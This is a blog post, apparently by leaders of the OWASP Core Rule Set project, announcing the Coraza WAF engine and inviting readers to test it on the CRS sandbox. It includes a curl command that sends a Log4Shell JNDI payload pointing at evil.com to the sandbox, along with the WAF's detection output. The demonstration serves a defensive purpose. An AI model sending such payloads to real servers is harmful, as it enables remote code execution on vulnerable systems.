---

date: 2021-12-22 00:00:00-0700
categories: blog
author: Christian Folini
author_image:
layout: blogpost
title: OWASP Core Ruleset Project announces Coraza SecLang engine
excerpt_separator: <!--more-->

---

The OWASP ModSecurity Core Rule Set project has been waiting for an alternative WAF engine for quite some time. But the waiting is coming to an end now with the arrival of the new Coraza WAF, a fully compliant OSS WAF engine able to run CRS in production.

<!--more-->

Coraza is an implementation of a ModSecurity SecLang engine in the memory-safe Go language, all developed by Juan Pablo Tosso from Chile. Coraza is currently only working on the Caddy web server, but Coraza already passes 100% of the CRS test suite and we are convinced it is production ready. Juan Pablo has picked up work on Apache and NGINX integration, and he wants to make it a drop-in replacement for ModSecurity. And then many, many more plans. The only obstacle to fill these with life is the lack of a developer community around Coraza. And we sincerely hope that the beauty of the project will inspire people to check it out and join!

To give you an early access to Coraza, if you do not have a Caddy webserver to play around, we have set up a Caddy with Coraza on our CRS sandbox, and you can try it out immediately. In the following example, we will send a Log4J exploit to the sandbox. Note that with the “x-backend” header, we pick Coraza as an engine, and with “x-crs-version” we pick the Core Rule Set with the extra Log4J rule from our earlier Log4J blog post.

    $ curl -H "x-crs-paranoia-level: 4" \
          -H "x-format-output: txt-matched-rules" \
          -H "x-backend: coraza" \
          -H "x-crs-version: 3.4.0-dev-log4j" \
          -H 'User-Agent: ${jndi:ldap://evil.com}' \
          https://sandbox.coreruleset.org
    1005 PL1 Potential Remote Command Execution: Log4j CVE-2021-44228
    932130 PL1 Remote Command Execution: Unix Shell Expression Found
    949110 PL1 Inbound Anomaly Score Exceeded (Total Score: 10)
    980130 PL1 Inbound Anomaly Score Exceeded (Total Inbound Score: 10 - SQLI=0,XSS=0,RFI=0,LFI=0,RCE=10,PHPI=0,HTTP=0,SESS=0): individual paranoia level scores: 10, 0, 0, 0

We are not sailing away from the ModSecurity island just yet, but we are helping to build a new ship. While we see problems with the viability of the ModSecurity project, we will continue to test it and report issues with ModSecurity productively in order to help improve its outlook. Meanwhile, we will work with the community on creating alternatives such as Coraza, so our users can use the Core Rule Set with any modern setups for many years to come. Our sandbox will be a useful asset to help us assess and compare various engines, to give our users as many options as possible.

If you are interested in looking at Coraza, here are some interesting links:

* [https://coraza.io](https://coraza.io)
* [https://coraza.io/docs/tutorials/introduction/](https://coraza.io/docs/tutorials/introduction/)
* [https://github.com/jptosso/coraza-waf](https://github.com/jptosso/coraza-waf)

We will keep you updated on new developments in this regard.

Walter Hop and Christian Folini, leaders of the OWASP ModSecurity Core Rule Set project
